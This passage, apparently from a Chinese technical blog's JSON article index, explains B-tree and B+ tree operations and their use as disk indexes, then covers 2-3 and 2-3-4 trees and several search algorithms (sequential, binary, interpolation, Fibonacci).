删除后当前节点只有一个数据元素，因此不满足条件，而左兄弟节点有三个数据元素，可以从兄弟节点借一个值为9的数据元素，同时更新将父节点中的key由10也变为9，删除结束。 删除7，删除后如下图所示： 当前节点数据元素的个数小于2，（左）兄弟节点中的也没有富余的关键字（当前节点还有个右兄弟，不过选择任意一个进行分析就可以了，这里我们选择了左边的），所以当前节点和兄弟节点合并，并删除父节点中的key，当前节点指向父节点。 此时当前节点key的个数小于2，兄弟节点的key也没有富余，所以父节点中的关键字下移，和两个孩子节点合并，结果如下图所示： 为什么使用B树或B+树作为索引理论上，红黑树等数据结构也可以用来实现索引，但是文件系统及数据库系统普遍采用B树或B+树作为索引结构。 一般来说，索引本身也很大，不可能全部存储在内存中，因此索引往往以索引文件的形式存储的磁盘上。这样的话，索引查找过程中就要产生磁盘I/O消耗，相对于内存存取，I/O存取的消耗要高几个数量级，所以评价一个数据结构作为索引的优劣最重要的指标就是在查找过程中磁盘I/O操作次数的渐进复杂度。换句话说，索引的结构组织要尽量减少查找过程中磁盘I/O的存取次数。下面先介绍内存和磁盘存取原理，然后再结合这些原理分析B树或B+树作为索引的效率。 主存存取原理目前计算机使用的主存基本都是随机读写存储器（RAM），现代RAM的结构和存取原理比较复杂，这里本文抛却具体差别，抽象出一个十分简单的存取模型来说明RAM的工作原理。 从抽象角度看，主存是一系列的存储单元组成的矩阵，每个存储单元存储固定大小的数据。每个存储单元有唯一的地址，现代主存的编址规则比较复杂，这里将其简化成一个二维地址：通过一个行地址和一个列地址可以唯一定位到一个存储单元。上图展示了一个4 x 4的主存模型。 主存的存取过程如下： 当系统需要读取主存时，则将地址信号放到地址总线上传给主存，主存读到地址信号后，解析信号并定位到指定存储单元，然后将此存储单元数据放到数据总线上，供其它部件读取。 写主存的过程类似，系统将要写入单元地址和数据分别放在地址总线和数据总线上，主存读取两个总线的内容，做相应的写操作。 这里可以看出，主存存取的时间仅与存取次数呈线性关系。因为不存在机械操作，两次存取的数据的“距离”不会对时间有任何影响，例如，取A0、A1和取A0、D3的时间总消耗是一样的。 磁盘存取原理上文说过，索引一般以文件形式存储在磁盘上，索引检索需要磁盘I/O操作。与主存不同，磁盘I/O存在机械运动耗费，因此磁盘I/O的时间消耗是巨大的。 下图是磁盘的整体结构示意图： 一个磁盘由大小相同且同轴的圆形盘片组成，磁盘可以转动（各个磁盘必须同步转动）。在磁盘的一侧有磁头支架，磁头支架固定了一组磁头，每个磁头负责存取一个磁盘的内容。磁头不能转动，但是可以沿磁盘半径方向运动（实际是斜切向运动），每个磁头同一时刻也必须是同轴的，即从正上方向下看，所有磁头任何时候都是重叠的（不过目前已经有多磁头独立技术，可不受此限制）。 下图是磁盘结构的示意图： 盘片被划分成一系列同心环，圆心是盘片中心，每个同心环叫做一个磁道，所有半径相同的磁道组成一个柱面。磁道被沿半径线划分成一个个小的段，每个段叫做一个扇区，每个扇区是磁盘的最小存储单元。为了简单起见，我们下面假设磁盘只有一个盘片和一个磁头。 当需要从磁盘读取数据时，系统会将数据逻辑地址传给磁盘，磁盘的控制电路按照寻址逻辑将逻辑地址翻译成物理地址，即确定要读的数据在哪个磁道，哪个扇区。为了读取这个扇区的数据，需要将磁头放到这个扇区上方，为了实现这一点，磁头需要移动对准相应磁道，这个过程叫做寻道，所耗费时间叫做寻道时间，然后磁盘旋转将目标扇区旋转到磁头下，这个过程耗费的时间叫做旋转时间。 局部性原理与磁盘预读由于存储介质的特性，磁盘本身存取就比主存慢很多，再加上机械运动耗费，磁盘的存取速度往往是主存的几百分分之一，因此为了提高效率，要尽量减少磁盘I/O。为了达到这个目的，磁盘往往不是严格按需读取，而是每次都会预读，即使只需要一个字节，磁盘也会从这个位置开始，顺序向后读取一定长度的数据放入内存。这样做的理论依据是计算机科学中著名的局部性原理： 当一个数据被用到时，其附近的数据也通常会马上被使用。 程序运行期间所需要的数据通常比较集中。 由于磁盘顺序读取的效率很高（不需要寻道时间，只需很少的旋转时间），因此对于具有局部性的程序来说，预读可以提高I/O效率。 预读的长度一般为页（page）的整倍数。页是计算机管理存储器的逻辑块，硬件及操作系统往往将主存和磁盘存储区分割为连续的大小相等的块，每个存储块称为一页（在许多操作系统中，页得大小通常为4k），主存和磁盘以页为单位交换数据。当程序要读取的数据不在主存中时，会触发一个缺页异常，此时系统会向磁盘发出读盘信号，磁盘会找到数据的起始位置并向后连续读取一页或几页载入内存中，然后异常返回，程序继续运行。 B树或B+树索引的性能分析到这里终于可以分析B树或B+树作为索引的性能了。 上文说过一般使用磁盘I/O次数评价索引结构的优劣。先从B树分析，根据B树的定义，可知查找一个值最多需要访问h个节点。数据库系统的设计者巧妙利用了磁盘预读原理，将一个节点的占用大小等于等于一个页的大小，这样读取一个节点只需要进行一次I/O操作即可。为了达到这个目的，在实际实现B树时，还需要使用如下技巧： 每次新建节点时，直接申请一个页的空间，这样就保证一个节点物理上就存储在一个页里，加之计算机存储分配都是按页对齐的，就实现了读取一个节点只需要进行一次I/O。 B树中一次检索最多需要进行h-1次I/O（根节点常驻内存，h为树的高度），渐进复杂度为$O(h)=O(log_dN)$。一般实际应用中，树的度d是一个非常大的数字，通常超过100，因此h非常小（通常不超过3）。 综上所述，用B树作为索引结构效率是非常高的。 而红黑树这种结构，h明显要深的多。由于逻辑上很近的节点（父子）物理上可能很远，无法利用局部性，所以红黑树的I/O渐进复杂度也为O(h)，但效率明显比B-Tree差很多（因为红黑树的深度比B-Tree要大很多）。 上文还说过，B+树更适合外存索引，原因和内节点的度d有关。从上面分析可以看到，d越大索引的性能越好，而内节点度的上限取决于内节点内key和data的大小： $d_{max}=floor(pagesize/(keysize+datasize+pointsize))$ floor表示向下取整。由于B+树的内节点均去掉了data域，因此可以拥有更大的度，拥有更好的性能。 Reference 看图轻松理解数据结构与算法系列(B+树) - https://juejin.im/post/5b9073f9f265da0acd209624 MySQL索引背后的数据结构及算法原理 - http://blog.codinglabs.org/articles/theory-of-mysql-index.html 浅谈算法和数据结构: 十 平衡查找树之B树 - https://www.cnblogs.com/yangecnu/p/Introduce-B-Tree-and-B-Plus-Tree.html 现代存储系统背后的算法 - https://www.infoq.cn/article/algorithms-behind-modern-storage-systems B树和B+树的插入、删除图文详解 - https://www.cnblogs.com/nullzx/p/8729425.html","comments":true,"categories":[{"name":"DataStructure","slug":"DataStructure","permalink":"http://swsmile.info/categories/DataStructure/"}],"tags":[{"name":"Data Structure","slug":"Data-Structure","permalink":"http://swsmile.info/tags/Data-Structure/"}]},{"title":"【Data Structure】多路平衡查找树 - B树（B-Tree）","date":"2019-06-04T07:36:41.000Z","path":"2019/06/04/【Data-Structure】树-多路平衡查找树-B树/","text":"B树（B-tree） 在计算机科学中，B树（B-tree）是一种树状数据结构，它能够存储数据、对其进行排序并允许以$O(log_2n)$的时间复杂度运行进行查找、顺序读取、插入和删除的数据结构。B树，概括来说是一个节点可以拥有多于2个子节点的平衡查找树，因为其一个节点可以拥有多于2个子节点，因而也可以称为多路平衡查找树（Multi-way Self-balancing Search Tree），简称为多路查找树。 B 树是一种广为使用的读优化索引数据结构，是二叉树的一种泛化。它具有多种变体，并已用于多种数据库（包括MySQL InnoDB4和PostgreSQL7）和文件系统（例如，HFS+8、ext4 中的 HTrees9）。B 树中的“B”表示“Bayer”，指的是数据结构的最初创立者 Rudolf Bayer，也可以说是 Bayer 彼时供职的波音公司（Boeing）。 与自平衡二叉查找树（Self-balancing Binary Search Tree）不同，B-树为系统最优化大块数据的读和写操作。B树减少定位记录时所经历的中间过程，从而加快存取速度。普遍运用在数据库和文件系统。” 总的来说，B/B+树是为了磁盘或其它存储设备而设计的一种多路平衡查找树（多路平衡查找树的”多路”，是相对于”二叉”而言，即B树的一个节点，可以有多个子树，或者说子节点)。与红黑树相比，在相同的的节点的情况下，一颗B/B+树的高度远远小于红黑树的高度。B/B+树上操作的时间通常由存取磁盘的时间和CPU计算时间这两部分构成，而CPU的速度非常快，所以B树的操作效率取决于访问磁盘的次数，关键字总数相同的情况下B树的高度越小，磁盘I/O所花的时间越少。 B 树可以看作是对2-3查找树的一种扩展。 在B树中，一条数据元素记录为一个二元组[key, data]，key为记录的键值，对于不同数据记录，key是互不相同的；data为数据记录除key外的数据。 假设一棵B树的阶（度）为M，则： 子节点： 对于根节点，子树个数范围为0或[2,M]； 除了根节点和叶子节点外，每个节点最多有M个孩子，至少有ceil(M/2)个孩子（注：ceil()是朝正无穷方向取整的函数 如ceil(1.1)结果为2)。 节点的数据元素： 每个节点数据元素的个数范围为[1,M-1]，并且以升序排列； 一个有k个叶子节点的非叶子节点有且只能有k-1个数据元素。 其他： 所有叶子节点在同一层。 下图是一个d=4的B-Tree： 性能一个度为d的B-Tree，设其索引了N个key（或者说，它包含了N个数据元素），则其树高h的上限为$log_d((N+1)/2)$，检索一个key，其查找节点个数的渐进复杂度为$O(log_dN)$。从这点可以看出，B-Tree是一个非常有效率的索引数据结构。 操作插入操作例子1下面以一个5阶B树为例，介绍B树的插入操作，在5阶B树中，节点中最多有4个数据元素。 在空树中插入值为39的数据元素： 此时根节点就1个数据元素，此时根节点也是叶子节点。 继续依次插入值分别为22，97和41的数据元素： 根节点此时有4个数据元素。 继续插入值为53的数据元素： 插入后超过了一个节点中最大有4个数据元素的个数，所以以值为41的数据元素为中心进行分裂，结果如下图所示，分裂后当前节点指针指向父节点，满足B树条件，插入操作结束。 当阶数m为偶数时，需要分裂时就不存在排序恰好在中间的数据元素，那么我们选择中间位置的前一个数据元素或中间位置的后一个数据元素为中心进行分裂即可。 依次插入值分别为13，21，40的数据元素，同样会造成分裂，分裂后结果如下图所示。 依次插入值分别为27，30，33的数据元素； 再依次插入值分别为36，35，34的数据元素；当插入34后，发生分裂。 再依次插入值分别24，29的数据元素，插入后结果如下图所示： 插入值为26的数据元素，插入后的结果如下图所示。 当前节点需要以值为27的数据元素为中心分裂，并向父节点进位27，然后当前节点指向父节点，结果如下图所示。 进位后导致当前节点（即根节点）也需要分裂，分裂后的结果如下图所示： 分裂后当前节点指向新的根，此时无需调整。 最后再依次插入值分别为17，28，29，31，32的的数据元素，当插入32时，发生分裂，分裂后的结果如下图所示： 例子2假设现在构建一棵四阶B树，开始插入“A”，直接作为根节点， 插入“B”，大于“A”，放右边， 插入“C”，按顺序排到最后， 继续插入“D”，直接添加的结果如下图，此时超过了节点可以存放容量，对于四阶B树每个节点最多存放3个值，此时需要执行分裂操作， 分裂操作为，先选取待分裂节点的中值，这里为“B”，然后将中值“B”放到父节点中，因为这里还没有父节点，那么直接创建一个新的父节点存放“B”，而原来小于“B”的那些值作为左子树，原来大于“B”的那些值作为右子树。 继续插入“E”，”E”大于“B”，往右子节点， 分别于“C”和“D”比较，大于它们，放到最右边， 插入“F”，“F”大于“B”，往右子树， “F”分别与“C””D””E”比较，大于它们，放到最右边，此时触发分裂操作， 选取待分裂节点的中值“D”，然后将中值“D”放到父节点中，父节点中的“B”小于“D”，于是放到“B”右边，而原来小于“D”的那些值作为左子树，原来大于“D”的那些值作为右子树。 继续插入“M”，结果为， 插入“L’，大于“B”“D”，往右子树， “L”大于“E”“F”小于“M”，于是放到第三个位置，此时触发分裂操作， 选取待分裂节点的中值“F”，然后将中值“F”放到父节点中，父节点中的“B”“D”都小于“F”，于是放到最右边，而原来小于“F”的那些值作为左子树，原来大于“F”的那些值作为右子树。 插入“K”，结果为， 插入“J”，大于“B”“D”“F”，往右子树， “J”小于“K”“L”“M”，于是放到第一个位置，此时触发分裂操作， 选取待分裂节点的中值“K”，然后将中值“K”放到父节点中，父节点中的“B”“D”“F”都小于“K”，于是放到最右边，而原来小于“K”的那些值作为左子树，原来大于“K”的那些值作为右子树。此时父节点也触发分裂操作， 选取待分裂节点的中值“D”，然后将中值“D”放到父节点中，由于还没有父节点，那么直接创建一个新的父节点存放“D”，而原来小于“D”的那些值作为左子树，原来大于“D”的那些值作为右子树。 插入“I”，大于“D”，往右子树， 右子树不是叶子节点，继续往下，这时“I”大于“F”而小于“K”，所以往第二个分支， “I”小于“J”，于是放到左边， 类似地，插入“H”，结果如下， 插入“G”，往右子树， 往中间分支， 触发分裂操作， 选取待分裂节点的中值“H”，然后将中值“H”放到父节点中，”H”大于父节点中的“F”而小于“K”，于是放到中间，而原来小于“H”的那些值作为左子树，原来大于“H”的那些值作为右子树。 综上所述，插入操作的核心是分裂操作。无需分裂的情况比较简单，直接插入即可；如果插入后超过节点容量，这个容量可预先自定义，则需要进行分裂操作，需要注意的是分裂可能引起父节点需要继续分裂。 查找操作对B树进行查找就比较简单，查找过程有点类似二叉搜索树，从根节点开始查找，根据比较数值找到对应的分支，继续往子树上查找。 比如查找“I”，”I”大于“D”，往右子树， “I”分别与节点内值比较，大于“F”“H”而小于“K”，往第三个分支， 逐一比较节点内的值，找到“I”。 删除操作删除操作比较复杂，主要是因为删除的值可能在叶子节点上也可能在非叶子节点上，而且删除后可能导致不符合B树的规定，这里暂且称之为导致B树不平衡，于是要进行一些合并、左旋、右旋等操作，使之符合B树的规定（即让B树平衡）。另外，如果是删除非叶子节点的值，则需要先找到中序前驱来替换。 情况一 - 删除叶子元素，不影响平衡要删除的值在叶子节点上且不影响B树的平衡结构（或者说，这个叶子节点上包含大于等于两个值），比如删除“I”，从根节点开始查找，“I”大于“D”，往第二个分支： 逐一与节点内的值进行比较，“I”大于“F”，继续比较，“I”大于“H”继续比较，“I”小于“K”，所以往第三个分支继续往下查找： 此时找到“I”： 直接删除“I”，完成删除操作： 情况二 - 删除叶子节点，影响平衡，左旋要删除的值在叶子节点上，而删除该值后，会打破B树的平衡，因此需要从右兄弟节点中借值，而且右兄弟节点中有足够的值借给它（或者说，这个右兄弟节点中包含大于等于两个值）。比如删除“G”，从根节点开始查找，“G”大于“D”，往右子树： 逐一比较节点内的值，发现应该往第二个分支： 找到“G”： 此时发现“G”节点的右兄弟节点有值可以借给它，于是删除“G”，然后进行左旋操作。左旋，即原来的父节点中的“H”值下移到左子节点中，以填补原来的“G”节点，右子节点中最小的值“I”提升到父节点，最终如下： 最终，完成删除操作： 情况三 - 删除叶子节点，影响平衡，右旋要删除的值在叶子节点上，删除该值，会打破B树的平衡，因此需要从左兄弟节点中借值，而且左兄弟节点有足够的值借给它（或者说，这个左兄弟节点中包含大于等于两个值）。比如删除“L”，从根节点开始查找，“L”大于“D”，往右子树： 逐一比较节点内的值，发现应该往第四个分支： 找到“L”： 此时发现“L”节点的左兄弟节点有多的值可以借给它，于是删除“L”，然后进行右旋，右旋即原来的父节点中的“K”值下移到右子节点填补原来的“L”值，左子节点中最大的值“J”提升到父节点中，最终如下： 完成删除操作： 情况四 - 删除叶子节点，影响平衡要删除的值在叶子节点上，删除后打破平衡，而且左右兄弟节点都没有值可以借给它（或者说，左右兄弟节点中分别只包含一个值）。比如删除“G”，从根节点开始查找，“G”大于“D”，往右子树： 逐一比较节点内的值，发现应该往第二个分支： 找到“G”： 此时发现，“G”节点中的“G”值删除掉后，左右兄弟节点都无法借值给它，因此执行合并操作： 合并操作，是将父节点对应的“F”值下移到左子节点中，最终结果如下，完成删除操作： 需要注意的是如果执行合并操作后使父节点不平衡，则需要继续对父节点继续进行平衡处理。比如下面的例子，需要删除“C”值，从根节点开始于“D”比较，小于“D”则往往第一个分支： 逐一与子节点内的值比较，“C”大于“B”则往第二个分支： 找到“C”： 此时发现删除“C”值对应的节点后，左右兄弟节点都无法借值给它（因为左右兄弟节点都分别只包含一个值）： 执行合并操作，将父节点中的值“B”下移到左子节点中，合并后结果如下，父节点已经变成空了，树不平衡： 此时，父节点的右兄弟节点可以借值给它，即执行左旋操作，父节点的父节点的“D”值下移到父节点中，父节点的兄弟节点的最左边值“F”上移到父节点的父节点中： 另外，左旋操作还包括要将移动值“F”对应节点的第一个分支（即“E”）移到父节点“D”的最右分支，最终结果如下： 情况五 - 删除非叶子节点要删除在非叶子节点上的值。比如删除“M”，从根节点开始查找，“M”大于“H”，往第二个分支： 逐一比较子节点内的值，找到“M”， 删除非叶子节点中值的第一步，就是要先找到对应的中序前驱，即第一个分支子节点中最大的值： 然后一直往最后一个分支找，最终找到“L”值为待删除值的中序前驱，将其提升到待删除值“M”的位置。提升后，导致了树不平衡，但它发现兄弟节点可以借值给它， 于是进行右旋操作，父节点中的“K”值下移到原来前驱节点的位置，左兄弟节点中最右边的值“J”提升到父节点中，另外如果左兄弟节点“J”值有右子节点的话，也需要挂到“K”节点的左边。最终完成删除操作。 除此之外，再看看删除根节点的情况，删除只有一个值的根节点，比如删除“D”， 先找中序前驱，即第一个分支子节点中最大的值， 一直往最后一个分支找，最终找到“C”值为待删除值对应节点的前驱节点，将其提升到根节点中， 此时引起不平衡，而且原来“C”节点的左右兄弟节点都无法借值给它， 此时只能做合并处理，将父节点中的值“B”下移到左子节点，合并后原来的父节点变为空，产生了不平衡，此时它的兄弟节点可以借值给它，所以需要执行左旋操作： 左旋即将“C”下移，“F”提升， 而且还要将“E”值挂到“C”节点上，最终如下。 Reference 看图轻松理解数据结构与算法系列(B树) - https://juejin.im/post/5b873a1af265da43741e2328 看图轻松理解数据结构与算法系列(B树的删除) - https://juejin.im/post/5b95ba52f265da0af87952a9 MySQL索引背后的数据结构及算法原理 - http://blog.codinglabs.org/articles/theory-of-mysql-index.html","comments":true,"categories":[{"name":"DataStructure","slug":"DataStructure","permalink":"http://swsmile.info/categories/DataStructure/"}],"tags":[{"name":"Data Structure","slug":"Data-Structure","permalink":"http://swsmile.info/tags/Data-Structure/"}]},{"title":"【Data Structure】多路平衡查找树 - 2-3 查找树和 2-4 查找树","date":"2019-06-04T01:53:28.000Z","path":"2019/06/04/【Data-Structure】树-多路平衡查找树 - 2-3查找树和 2-4 查找树/","text":"背景二叉搜索树（Binary Search Tree）在很多情况下可以良好的工作，但它的限制是最坏情况下的时间复杂度为 O(n)。 平衡二叉搜索树（Self-balancing Binary Search Tree）的设计则是保证其高度在最坏的情况下时间复杂度为 $O(log_2n)$，其插入、删除和查找操作的时间复杂度均为 $O(log_2n)$。常见的平衡二叉搜索树包括 AVL树、红黑树。 多路平衡查找树（Multi-way Self-balancing Search Tree）作为一般化的平衡二叉搜索树（Self-balancing Binary Search Tree），现在其实存在很多种类的平衡搜索树，常见的有2-3查找树、2-4查找树、B 树、B+树等。 2-3 树 2-3 树中节点和存储的元素符合如下性质要求： 任一节点只能是 2 度节点（2-node）或 3 度节点（3-node），不存在值的数量为 0 的节点。 2 度节点（2-node）：包含 1 个值，且只有 2 个子节点的节点： 左子节点子树中所有节点的值都小于这个2 度节点的值； 右子节点子树中所有节点的值都大于等于这个2 度节点的值。 3 度节点（3-node）：包含 2 个值，且只有 3 个子节点的节点： 该节点的左值小于右值； 左子节点子树中所有节点的值都小于这个 3 度节点的左值； 中子节点子树中所有节点的值都大于等于这个 3 度节点的左值，且小于这个 3 度节点的右值； 右子节点子树中所有节点的值都大于这个 3 度节点的右值。 所有叶子节点都拥有相同的深度（depth），或者说，根节点到每一个为空节点的距离都相同。 元素始终保持排序顺序。 性能分析2-3树的查找效率与树的高度是息息相关的。 在最坏的情况下，也就是所有的节点都是2-node节点，查找效率为$log_2N$； 在最好的情况下，所有的节点都是3-node节点，查找效率为$log_3N$约等于$0.631log_2N$； 距离来说，对于1百万个节点的2-3树，树的高度为12-20之间，对于10亿个节点的2-3树，树的高度为18-30之间。 对于插入来说，只需要常数次操作即可完成，因为他只需要修改与该节点关联的节点即可，不需要检查其他节点，所以效率和查找类似。下面是2-3查找树的效率： 查找操作在进行2-3树的查找之前，我们先假设已经处于平衡状态。 2-3树的查找和二叉查找树类似，我们首先将待查找值和根节点进行比较，如果相等，则查找成功；否则，往下继续查找，对于只有两个子节点的节点，则在其左右子树中递归查找；而对于有三个子节点的节点，则需要在左中右子树中递归查找。 如下2-3树： 查找“C”节点从根节点开始，与“D”比较，“C”小于“D”则往左， 继续与“B”比较，“C”大于“B”则往右， “C”与“C”相等，找到。 查找“H”节点 从根节点开始，“H”大于“D”则往右。 在“FH”节点中逐个项比较，先跟“F”项比较，“H”大于“F”，继续比较下一项， “H”等于“H”，找到，在“FH”节点中找到“H”。 查找“G”节点从根节点开始，“G”大于“D”则往右： “G”与“FH”节点逐个比较，大于“F”，继续比较下一项： “G”小于“H”，即“G”间于“F”和“H”之间，于是往中间， “G”等于“G”，找到。 插入操作刚开始是空树，插入节点“A”，创建根节点， 插入节点“B”，从根节点开始寻找存放的节点位置，与“A”节点合并后放到同一个叶子上，此时该叶子只包含“AB”两个项目，无需分裂， 继续插入节点“C”，从根节点开始寻找存放的节点位置，找到“AB”叶子节点，将其放进去， 但此时该叶子节点包含了“ABC”三个项目，需要将该节点进行分裂操作，分裂的具体过程如下，找到该节点三个项目中中间大的项， 上移成为最小项和最大项的父节点，而最小项作为中间项的左子节点，最大项作为中间项的右子节点。 继续插入“D”节点，从根节点开始寻找， 大于“B”，所以往右， 找到“C”节点，并合并到该叶子节点，该节点只有两个项目，不必分裂。 继续插入“E”，查找到“CD”叶子节点，放入“E”节点后发现该叶子节点有三个项目，需要分裂， 将中间项提升到父节点，其余两项分裂成两个子节点，“D”上升到父节点后存放在右边，而且父节点只有两个项目，不必再继续分裂。 继续插入“F”节点， 往下看连续分裂两次的情况，继续插入“G”节点，大于“B”，继续比较， 大于“D”，往右子节点， 到右子节点后与“F”比较，发现大于“F”，放到右边， 发现“EFG”叶子节点有三个项目，必须分裂， 将中间项“F”提升到父节点，“E”和“G”左右两项分别称为左右子节点， 提升到父节点后发现父节点包含了“BDF”三项，也需要分裂，于是准备将中间项“F”提升， 发现“BDF”节点本来属于根节点，那么分裂后就没有根节点了，于是需要创建一个新节点作为根节点，即提升的“D”节点作为新的根节点。“B”和“F”左右两项分别作为左右子节点。 总结起来就是：一个节点插入到一棵2-3树中，先寻找该节点应该落到哪个叶子节点上，注意一定是在叶子节点。将新节点作为一个新项加入到叶子节点中，此时如果该节点只有两个项目，则完成插入操作。但如果该节点有三个项目，则需要进行分裂操作，左中右三项按大小排序，将中间项提升到父节点中，而左右两项作为左右子节点，然后可能还没完，因为父节点上可能又包含了三个项目，如果是这样还得做分裂操作，一直递归到父节点只包含一个或两个项目。 2-3-4 树（2-4 树）2-3-4 树中节点和存储的元素符合如下性质要求： 任一节点只能是 2 度节点、3 度节点或 4 度节点，不存在元素数为 0 的节点。 2 度节点：包含 1 个值，且只有 2 个子节点； 3 度节点：包含 2 个值，且只有 3 个子节点； 4 度节点：包含 3 个值，且只有 4 个子节点； 所有叶子节点都拥有相同的深度（depth）。 元素始终保持排序顺序。 2 度节点 3 度节点 4 度节点 ​ 其中，每个子节点仍是一棵 2-3-4 树，但子节点可能为空。 在 2-3-4 树中，所有叶子节点都在同一层，也就是最底层。但是元素却可以出现在所有节点中，也就是说，即使是叶子节点，也可以包含1、2 或 3 个元素，但不能没有元素。2-3-4 树保持着完美的平衡，每一条到叶子节点的路径都是等长的。 非叶子节点必须拥有至少 1 个子节点。设节点的子节点的数量为 L，节点包含元素的数量为 D，则：L = D + 1 。 因为 2-3-4 树中的节点至多包含 4 个子节点，所以该树叶称为 4 阶多路树（multiway tree of order 4）。 操作查找操作在 2-3-4 树中查找结点，分为以下几个步骤： 将被查找的元素与节点中存储的元素进行比较； 查找包含被查找元素的区间； 若区间存在，则移至子节点，回到第 1 步继续查找； 插入操作插入节点时，将从根节点开始查找，步骤如下： 如果当前节点为 4 度节点（也就是有 3 个元素）： 移除并保存节点中间的元素值，然后生成一个 3 度节点（仅有 2 个元素）； 将该 3 度节点分裂成一对 2 度节点（仅有 1 个元素）； 如果当前节点是根节点： 被保存的中间值将被设置为新的根节点，该根节点为 2 度节点，则树的高度将增加 1； 否则，将中间值加入父节点中。 查找子节点中可以包含被插入值的区间； 如果找到的节点是一个叶子节点，则将被插入值放入该节点中，插入操作结束； 否则，继续查找子节点，或回到步骤 1。 例子例如，现在要将值 “25” 插入到如下的 2-3-4 树中： 从根节点（10,20）开始查找，向子树查找，直到找到子节点（22,24,29）。因为区间（20,∞）包含 25。 节点（22,24,29）是一个 4 度节点，所以将其中间值 24 推到父节点中。 剩下的 3 度节点（22,29）将被分裂成一对 2 度节点，也就是（22）和（29）。新的父节点为（10,20,24）。 在下降到右侧子节点（29）。因为区间（24-29）包含 25。 节点（29）没有左孩子。可将 25 直接插入到该节点中，插入完毕。 节点的分裂方式将 4 度节点分裂的方式如下： 如果一个 4 度节点的父节点是一个 2 度节点，则将按如下方式分裂 4 度节点： 如果一个 4 度节点的父节点是一个 3 度节点，则将按如下方式分裂 4 度节点： 删除节点情况1：临近兄弟节点是 3 度节点或 4 度节点。 解决方案：通过旋转操作和移动子树来从临近节点偷元素（steal）。 情况2：临近兄弟节点是 2 度节点。 解决方案：通过与临近兄弟节点合并，并从父节点偷元素。 Reference 2-3树 - https://zh.wikipedia.org/wiki/2-3%E6%A0%91 平衡搜索树（2-3-4 树） - https://www.cnblogs.com/gaochundong/p/balanced_search_tree.html 浅谈算法和数据结构: 八 平衡查找树之2-3树 - https://www.cnblogs.com/yangecnu/p/Introduce-2-3-Search-Tree.html 看图轻松理解数据结构与算法系列(2-3树) - https://juejin.im/post/5b7e00456fb9a01a0b3193c7#heading-4","comments":true,"categories":[{"name":"DataStructure","slug":"DataStructure","permalink":"http://swsmile.info/categories/DataStructure/"}],"tags":[{"name":"Data Structure","slug":"Data-Structure","permalink":"http://swsmile.info/tags/Data-Structure/"}]},{"title":"【Algorithm】查找算法","date":"2019-06-03T14:05:25.000Z","path":"2019/06/03/【Algorithm】查找算法/","text":"查找是在大量的信息中寻找一个特定的信息元素，在计算机应用中，查找是常用的基本运算，例如编译程序中符号表的查找。 顺序查找顺序查找适合于存储结构为顺序存储或链接存储的线性表。 基本思想顺序查找也称为线形查找，属于无序查找算法。从数据结构线形表的一端开始，顺序扫描，依次将扫描到的结点关键字与给定值k相比较，若相等则表示查找成功；若扫描结束仍没有找到关键字等于k的结点，表示查找失败。 复杂度分析查找成功时的平均查找长度为：（假设每个数据元素的概率相等） ASL = 1/n(1+2+3+…+n) = (n+1)/2 ; 当查找不成功时，需要n+1次比较，时间复杂度为O(n); 所以，顺序查找的时间复杂度为O(n)。 二分查找说明：元素必须是有序的，如果是无序的，则要先进行排序操作。 基本思想：也称为是折半查找，属于有序查找算法。用给定值k先与中间结点的关键字比较，中间结点把线形表分成两个子表，若相等则查找成功；若不相等，再根据k与该中间结点关键字的比较结果确定下一步查找哪个子表，这样递归进行，直到查找到或查找结束发现表中没有这样的结点。 复杂度分析：最坏情况下，关键词比较次数为$log_2(n+1)$，且期望时间复杂度为$O(log_2n)$； 注：折半查找的前提条件是需要有序表顺序存储，对于静态查找表，一次排序后不再变化，折半查找能得到不错的效率。但对于需要频繁执行插入或删除操作的数据集来说，维护有序的排序会带来不小的工作量，那就不建议使用。——《大话数据结构》 特殊的二分查找插值查找在介绍插值查找之前，首先考虑一个新问题，为什么上述算法一定要是折半，而不是折四分之一或者折更多呢？ 打个比方，在英文字典里面查“apple”，你下意识翻开字典是翻前面的书页还是后面的书页呢？如果再让你查“zoo”，你又怎么查？很显然，这里你绝对不会是从中间开始查起，而是有一定目的的往前或往后翻。 同样的，比如要在取值范围1 ~ 10000 之间 100 个元素从小到大均匀分布的数组中查找5， 我们自然会考虑从数组下标较小的开始查找。 经过以上分析，折半查找这种查找方式，不是自适应的（也就是说是傻瓜式的）。二分查找中查找点计算如下： 1mid=(low+high)/2, 即mid=low+1/2*(high-low); 通过类比，我们可以将查找的点改进为如下： 1mid=low+(key-a[low])/(a[high]-a[low])*(high-low) 也就是将上述的比例参数1/2改进为自适应的，根据关键字在整个有序表中所处的位置，让mid值的变化更靠近关键字key，这样也就间接地减少了比较次数。 基本思想：基于二分查找算法，将查找点的选择改进为自适应选择，可以提高查找效率。当然，差值查找也属于有序查找。 注：对于表长较大，而关键字分布又比较均匀的查找表来说，插值查找算法的平均性能比折半查找要好的多。反之，数组中如果分布非常不均匀，那么插值查找未必是很合适的选择。 复杂度分析：查找成功或者失败的时间复杂度均为$O(log_2(log_2n))$。 斐波那契查找在介绍斐波那契查找算法之前，我们先介绍一下很它紧密相连并且大家都熟知的一个概念——黄金分割。 黄金分割黄金比例又称黄金分割，是指事物各部分间一定的数学比例关系，即将整体一分为二，较大部分与较小部分之比等于整体与较大部分之比，其比值约为1:0.618或1.618:1。 0.618被公认为最具有审美意义的比例数字，这个数值的作用不仅仅体现在诸如绘画、雕塑、音乐、建筑等艺术领域，而且在管理、工程设计等方面也有着不可忽视的作用。因此被称为黄金分割。 大家记不记得斐波那契数列：1, 1, 2, 3, 5, 8, 13, 21, 34, 55, 89…….（从第三个数开始，后边每一个数都是前两个数的和）。然后我们会发现，随着斐波那契数列的递增，前后两个数的比值会越来越接近0.618，利用这个特性，我们就可以将黄金比例运用到查找技术中。 斐波那契查找 基本思想：也是二分查找的一种提升算法，通过运用黄金比例的概念在数列中选择查找点进行查找，提高查找效率。同样地，斐波那契查找也属于一种有序查找算法。 相对于折半查找，一般将待比较的key值与第mid=（low+high）/2位置的元素比较，比较结果分三种情况： 1）相等，mid位置的元素即为所求 2）&gt;，low=mid+1; 3）&lt;，high=mid-1。 斐波那契查找与折半查找很相似，他是根据斐波那契序列的特点对有序表进行分割的。他要求开始表中记录的个数为某个斐波那契数小1，及n=F(k)-1; 开始将k值与第F(k-1)位置的记录进行比较(及mid=low+F(k-1)-1),比较结果也分为三种 1）相等，mid位置的元素即为所求 2）&gt;，low=mid+1,k-=2; 说明：low=mid+1说明待查找的元素在[mid+1,high]范围内，k-=2 说明范围[mid+1,high]内的元素个数为n-(F(k-1))= Fk-1-F(k-1)=Fk-F(k-1)-1=F(k-2)-1个，所以可以递归的应用斐波那契查找。 3）&lt;，high=mid-1,k-=1。 